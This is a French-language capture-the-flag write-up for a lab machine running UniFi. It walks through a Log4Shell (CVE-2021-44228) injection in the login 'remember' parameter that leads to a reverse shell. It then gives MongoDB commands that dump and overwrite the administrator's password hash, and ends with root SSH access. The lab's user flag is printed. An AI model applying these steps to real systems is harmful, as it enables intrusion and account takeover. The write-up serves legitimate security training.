
# Découverte
On identifie les ports ouverts sur la machine :
- 22 : ssh
- 6789
- 8080
- 8443

Sur le port 8443, une page https est présente et on y voit une page de connexion Unify en version 6.4.54.

Cette version est vulnérable à la CVE-2021-44228, qui est une CVE de Log4J.

# Exploitation de Log4J
Blog : https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

On fait une fausse tentative de connexion et on intercepte la requête avec Burp.
On observe qu'un requête POST /api/login est faite.

On exploite le paramètre remember en suivant le blog :
![[Pasted image 20231125173552.png]]

Lorsque cette requête est faite, le serveur va exécuter le code jndi et va faire une requête LDAP sur notre machine (ip 10.10.15.0).

On peut observer que notre machine reçoit la requête LDAP sur le port 1389 avec tcpdump :
```bash
tcpdump -i tun0 port 1389
```

Ensuite, on utilise l'exploit proposé sur le blog qui consiste à lancer un serveur sur notre machine qui écoutera sur le port 1389 et répondra à la requête venant du serveur vulnérable avec une payload permettant d'obtenir un reverse shell.
On lance un netcat en parallèle puis on refait la requête depuis Burp.

# Élévation de privilège
On a reverse shell avec les privilège de l'utilisateur `unifi`.
Déjà on améliore son shell pour avoir un shell interactif avec la commande suivante :
```bash
script /dev/null -c bash
```

## Flag user
En se promenant dans les répertoires, on trouve le flag utilisateur
```bash
cat ../../../home/michael/user.txt
6ced1a6a89e666c0620cdb10262ba127
```

## MongoDB
La commande `ps aux` nous permet de découvrir qu'un service MongoDB tourne sur le port 27117.
On se connecte à MongoDB :
```bash
mongo --port 27117

> help
...
> use ace                    # ace est le nom de la DB par défaut de Unifi
switched to db ace
> db.help()
...
> db.getCollectionNames()    # Les tables no-SQL s'appelent des collections
account
admin
...
# On liste les utilisateurs (qui sont dans la collection admin)
> db.admin.find()
{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.", "time_created" : NumberLong(1640900495), ...

# On remarque que l'on récupère le hash SHA-512 du compte administrateur
# On change le mot de passe du compte administrateur par "password"
> db.admin.update({ "name" : "administrator" }, { $set : { "x_shadow" : "$6$ybLXKYjTNj9vv$dgGRjoXYFkw33OFZtBsp1flbCpoFQR7ac8O0FrZixHG.sw2AQmA5PuUbQC/e5.Zu.f7pGuF7qBKAfT/JRZFk8/" } } )
```
On a alors accès à la console Unifi en tant qu'administrateur !

## Devenir root
Sur l'interface d'administration de Unifi, il y a une section "Device Authentication" des identifiants SSH de l'utilisateur root.
On se connecte en SSH en tant que root et on flag !
